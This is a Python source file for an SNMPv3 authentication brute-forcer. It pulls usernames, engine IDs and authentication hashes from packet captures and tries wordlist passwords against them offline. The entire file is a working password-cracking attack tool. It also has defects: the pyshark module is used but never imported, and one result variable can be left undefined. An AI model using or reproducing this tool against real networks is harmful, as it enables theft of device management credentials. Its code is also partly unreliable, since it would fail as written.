#!/usr/local/bin/python3
#########################################################################
#                                                                       #
# snmpv3brutem.py                                                       #
# by Eric Mboma                                                         #
# Son application peuvent être risquant                                                     #
#                                                                       #
# AuthKey calculation simplified from python implementation of snmpkey: #
# https://github.com/TheMysteriousX/SNMPv3-Hash-Generator               #
#                                                                       #
# INSPIRATION:                                                          #
# Write-up of process:                                                  #
# https://vad3rblog.wordpress.com/2017/09/11/snmp/                      #
#                                                                       #
# Bruteforce process ported from here:                                  #
# https://github.com/SalimHaddou/snmp0wn-md5/blob/master/snmp0wn-md5.sh #
#                                                                       #
#########################################################################

import hashlib, argparse, time, sys
from multiprocessing import Pool
from itertools import repeat
from binascii import unhexlify

class color:
   ### Used for formatting output text
   GREEN  = '\033[92m'
   YELLOW = '\033[93m'
   RED    = '\033[91m'
   BLUE   = '\033[94m'
   BOLD   = '\033[1m'
   END    = '\033[0m'

def validateArgparse(parser):
   ### Used to validate and process argparse arguments
   global hashType
   global singleWord
   
   # Validate proper usage of arguments from Argparse
   if len(sys.argv)==1:
      parser.print_help(sys.stderr)
      quit()

   if not args.wordlist and not args.singleWord:
      print("Error: You must specify a wordlist (-w) or single word (-W) to use for password cracking.")
      quit()

   if not args.pcapFile and not args.snmp:
      print("Error: You must specify a packet capture file (-p) for automated analysis or manually specify snmp variables (-m).")
      quit()

   if args.pcapFile and args.snmp:
      print("Error: You can only specify either a packet capture file (-p) for automated analysis or manually specify snmp variables (-m).")
      quit()
   
   #Make sure pcap and wordlist files exist, if submitted
   if args.pcapFile:
      try:
         f = open(args.pcapFile)
         f.close()
      except FileNotFoundError:
         print("The PCAP file {} doesn't exist! Quitting...".format(args.pcapFile))
         quit() 
 
   if args.wordlist:
      try:
         f = open(args.wordlist)
         f.close()
      except FileNotFoundError:
         print("The wordlist {} doesn't exist! Quitting...".format(args.wordlist))
         quit()
         
         
   # Create hashing algorithm to-do list
   hashType = args.hashType

   # Create a list of supplied words to be checked
   if args.singleWord:
      singleWord = args.singleWord
   else:
      singleWord = []

def process_packets(pcap):
   ### Used to extract SNMPv3 packets from pcap
   tasks = []
   # Add manually-specified SNMP variables to task list, if any
   counter = 1
   if args.snmp:
      tasks.append(['manual entry','manual entry','manual entry',args.snmp[0],args.snmp[1],args.snmp[2], counter])
      counter += 1

   # Process PCAP and add items to task list
   if pcap:
      print("Looking for SNMPv3 packets in {}...".format(pcap))
      cap = pyshark.FileCapture(pcap,display_filter='udp.srcport==161&&snmp.msgVersion==3&&snmp.msgUserName!=""',include_raw=True,use_json=True)
      for pkt in cap:
         update = True
         if int(pkt.udp.srcport) == 161 and int(pkt.snmp.msgVersion) == 3:
            for t in tasks:
               if pkt.ip.src != t[0] or pkt.ip.dst != t[1] or pkt.snmp.msgUserName != t[2]:
                  update = True
               else:
                  update = False
         if update == True:
            try:
               tasks.append([
                  pkt.ip.src,
                  pkt.ip.dst,
                  pkt.snmp.msgUserName,
                  pkt.snmp.msgAuthoritativeEngineID_raw[0],
                  pkt.snmp.msgAuthenticationParameters_raw[0],
                  pkt.snmp_raw.value,
                  counter])
               counter += 1
            except AttributeError:
               if args.verbose:
                  print("An attribute is missing in packet {}, skipping...".format(pkt.frame_info.number))
            except:
               if args.verbose:
                  print("An error occured with packet {}, skipping...".format(pkt.frame_info.number))
      cap.close()
   return(tasks)

def check_password(passphrase):
   ### Used to calculate hash for comparison against msgAuthenticationParameters
   passphrase = passphrase.rstrip()
   if len(passphrase) < 1:
      return None

   data = ((passphrase * (l//len(passphrase)+1))[:l]).encode('latin-1')

   if hashType in {'sha', 'all'}:
      # Calculate AuthKey and extendedAuthKey
      sha_digest1 = hashlib.sha1(data).digest()
      sha_AuthKey = hashlib.sha1(sha_digest1+E+sha_digest1).hexdigest()
      sha_extendedAuthKey = sha_AuthKey+'0'*88
   
      # Calculate testMsgAuthenticationParameters (hashK2)
      sha_K1 = (int(sha_extendedAuthKey, 16) ^ ipad_int).to_bytes(64,"big")
      sha_K2 = (int(sha_extendedAuthKey, 16) ^ opad_int).to_bytes(64,"big")
      
      sha_hashK1 = hashlib.sha1(sha_K1+wholeMsgMod).digest()
      sha_hashK2 = hashlib.sha1(sha_K2+sha_hashK1).hexdigest()
      
      # Check if calculated value equals msgAuthenticationParameters
      if sha_hashK2[0:24] == msgAuthenticationParameters:
         return([passphrase,"SHA"])

   if hashType in {'md5', 'all'}:
      # Calculate AuthKey and extendedAuthKey
      md5_digest1 = hashlib.md5(data).digest()
      md5_AuthKey = hashlib.md5(md5_digest1+E+md5_digest1).hexdigest()
      md5_extendedAuthKey = md5_AuthKey+'0'*96
  
      # Calculate testMsgAuthenticationParameters (hashK2)
      md5_K1 = (int(md5_extendedAuthKey, 16) ^ ipad_int).to_bytes(64,"big")            
      md5_K2 = (int(md5_extendedAuthKey, 16) ^ opad_int).to_bytes(64,"big")

      md5_hashK1 = hashlib.md5(md5_K1+wholeMsgMod).digest()
      md5_hashK2 = hashlib.md5(md5_K2+md5_hashK1).hexdigest()

      # Check if calculated value equals msgAuthenticationParameters
      if md5_hashK2[0:24] == msgAuthenticationParameters:
         return([passphrase,"MD5"])   

def printBanner():
   print("                                ____  _                _       ")
   print("                               |___ \\| |              | |      ")
   print("  ___ _ __  _ __ ___  _ ____   ____) | |__  _ __ _   _| |_ ___ ")
   print(" / __| '_ \\| '_ ` _ \\| '_ \\ \\ / /__ <| '_ \\| '__| | | | __/ _ \\")
   print(" \__ \\ | | | | | | | | |_) \\ V /___) | |_) | |  | |_| | ||  __/")
   print(" |___/_| |_|_| |_| |_| .__/ \\_/|____/|_.__/|_|   \\__,_|\\__\\___|")
   print("                     | |        by "+color.BOLD+color.BLUE+"Mboma Kakese Eric"+color.END+"                ")
   print("                     |_|           Son "+color.BOLD+color.RED+" application peuvent être risquant "+color.END+"            ")
   print("                                                               ")

def main():
   ### GREETZ
   printBanner()
   
   ### Main function
   ### Declare global variables for use in other functions
   global msgAuthenticationParameters
   global wholeMsgMod
   global args
   global E
   global ipad_int
   global opad_int
   global l

   # Constants
   ipad          = '36'*64
   opad          = '5c'*64
   l             = 1048576
   ipad_int      = int(ipad, 16)
   opad_int      = int(opad, 16)

   ### Argparse setup for CLI options
   # Argparse definitions
   usage='snmpv3brute.py - SNMPv3 Authentication Bruteforcer\n\nSNMPv3 authentication can be bruteforced to determine the cleartext password. This program can extract the required SNMP information from a packet capture file, or you can manually specify the required information using the "-m" option.\n\nTo use the -m option, get the data for the variables from a SNMPv3 packet in Wireshark. For msgAuthoritativeEngineID and msgAuthenticationParameters, right click on the packet field of the same name and select "Copy as Hex Stream". For wholeMsg, right click on Simple Network Management Protocol, and select "Copy as Hex Stream".\n\nExample: snmpv3brute.py -m 80001f888056417b0bd201d85d00000000 a34b57081ff0cef821e4da43 3081dc020103301002043cabfa64020205c0040103020103043f303d041180001f888056417b0bd201d85d00000000020101020200a20409736e6d705f75736572040ca34b57081ff0cef821e4da430408bec2e5f547aaa89c048183dfe158807f83a660d37264c7f397a8a42c237988ee829c52b003f6d772df683c51acb56bb327a36ee590e1d65c9466e9d18a48e80539e5fff12006d2fba6bc61756956285b84bafe773b6359d2273db3b6e49f89a6609a86ac5f440d4bfa55b17af5a81db1fa0030402bba9befad240addc41d9b394d0fb2c4a3f5ffde3730485cdaf6'
   parser = argparse.ArgumentParser(description=usage,formatter_class=argparse.RawTextHelpFormatter)
   parser.add_argument("-a", help="Use md5, sha, or both for hashing algorithm (default: %(default)s)", nargs='?', choices=['md5','sha','all'], default='all',const='all',dest='hashType', type=str.lower)
   parser.add_argument("-w", help="Specify wordlist to use (1 word per line)",dest='wordlist')
   parser.add_argument("-W", help="Specify words to use as password for testing",dest='singleWord',nargs='*',default=[])
   parser.add_argument("-p", help="Specify .pcap/.pcapng file with SNMP data", dest='pcapFile')
   parser.add_argument("-m", help="Manually specify msgAuthoriativeEngineID, msgAuthenticationParameters, and wholeMsg from Wireshark (in that order)", nargs=3, dest='snmp')
   parser.add_argument("-v", help="Verbose; print error messages", dest='verbose', action='store_true')
   args = parser.parse_args()

   # Make sure submitted arguments are valid
   validateArgparse(parser) 

   ### Process PCAP to find tasks and extract relevant info
   taskList=process_packets(args.pcapFile)

   ### Format and print tasklist
   # Determine length of variables for pretty tasklist formatting
   lenID = len(str(len(taskList)))
   if lenID < 2:
      lenID = 2
   lenIP = 10
   lenUN = 8
   for t in taskList:
      if len(t[0]) > lenIP:
         lenIP = len(t[0])
      if len(t[2]) > lenUN:
         lenUN = len(t[2])

   # Print tasklist header
   print(color.BOLD+"\nTasks to be processed:"+color.END)
   print(" ID {} IP address {} Username".format(" "*(1+int(lenID)-2)," "*(1+(int(lenIP))-10)))
   print("{} {} {}".format("-"*(int(lenID)+2),"-"*(int(lenIP)+2),"-"*(int(lenUN)+2)))

   # Print tasks
   for t in taskList:
      print(" {} {} {} {} {}".format(str(t[6]).zfill(2)," "*(int(lenID)-len(str(t[6]).zfill(2))+1),t[0]," "*(int(lenIP)-len(t[0])+1),t[2]))

   ### Process tasklist items and print results
   # Print results header
   print(color.BOLD+"\nResults:"+color.END)
   print(" ID {} IP address {} Username {} Alg   Password".format(" "*(1+int(lenID)-2)," "*(1+(int(lenIP))-10)," "*(1+(int(lenUN))-8)))
   print("{} {} {} {} {}".format("-"*(int(lenID)+2),"-"*(int(lenIP)+2),"-"*(int(lenUN)+2),"-"*5,"-"*10))

   # Process tasks and print results
   for t in taskList:
      keepTrying = True
      msgAuthoritativeEngineID    = str(t[3])
      msgAuthenticationParameters = str(t[4])
      wholeMsg                    = str(t[5])
      wholeMsgMod                 = unhexlify(wholeMsg.replace(msgAuthenticationParameters,'0'*24))

      # Precalculation to avoid repetition in check_password()
      E = unhexlify(msgAuthoritativeEngineID)
      
      startTime = time.time()
      
      print(" {} {} {} {} {} {} ".format(str(t[6]).zfill(2)," "*(int(lenID)-len(str(t[6]).zfill(2))+1),t[0]," "*(int(lenIP)-len(t[0])+1),t[2]," "*(int(lenUN)-len(t[2])+1)), end='') 
      print((color.YELLOW+"{}   Trying..."+color.END).format(hashType.upper()), end='\r')
            
      # Check single words first (either supplied with -W or added by multi-task processing)
      if (len(singleWord) > 0) and keepTrying:
         for w in singleWord:
            passwordFound = check_password(w)
            if passwordFound:
               keepTrying = False
               endTime = time.time()
               # Print current task findings
               print(" {} {} {} {} {} {} ".format(str(t[6]).zfill(2)," "*(int(lenID)-len(str(t[6]).zfill(2))+1),t[0]," "*(int(lenIP)-len(t[0])+1),t[2]," "*(int(lenUN)-len(t[2])+1)), end='') 
               print((color.GREEN+"{}   {}"+color.END+" ({:.2f}s)").format(passwordFound[1],str(passwordFound[0]),endTime-startTime)) 
               break
      
      # Check words in wordlist, if supplied   
        
      if args.wordlist and keepTrying:
         # Create and use multithreading pool for faster wordlist processing
         pool = Pool()
         with open(args.wordlist, "r", encoding='latin-1') as lines:
            results = pool.imap_unordered(check_password, lines, chunksize=1000)
            pool.close()
            for passwordFound in results:
               if passwordFound:
                  singleWord.append(passwordFound[0])
                  keepTrying = False
                  endTime = time.time()
                  pool.terminate()
                  # Print current task findings
                  print(" {} {} {} {} {} {} ".format(str(t[6]).zfill(2)," "*(int(lenID)-len(str(t[6]).zfill(2))+1),t[0]," "*(int(lenIP)-len(t[0])+1),t[2]," "*(int(lenUN)-len(t[2])+1)), end='') 
                  print((color.GREEN+"{}   {}"+color.END+" ({:.2f}s)").format(passwordFound[1],str(passwordFound[0]),endTime-startTime)) 
                  break

      if not passwordFound:
         # Print current task not found
         endTime = time.time()
         print(" {} {} {} {} {} {} ".format(str(t[6]).zfill(2)," "*(int(lenID)-len(str(t[6]).zfill(2))+1),t[0]," "*(int(lenIP)-len(t[0])+1),t[2]," "*(int(lenUN)-len(t[2])+1)), end='') 
         print((color.RED+"N/A   Not found"+color.END+" ({:.2f}s)").format(endTime-startTime)) 
   print("")

if __name__ == '__main__':
   main()
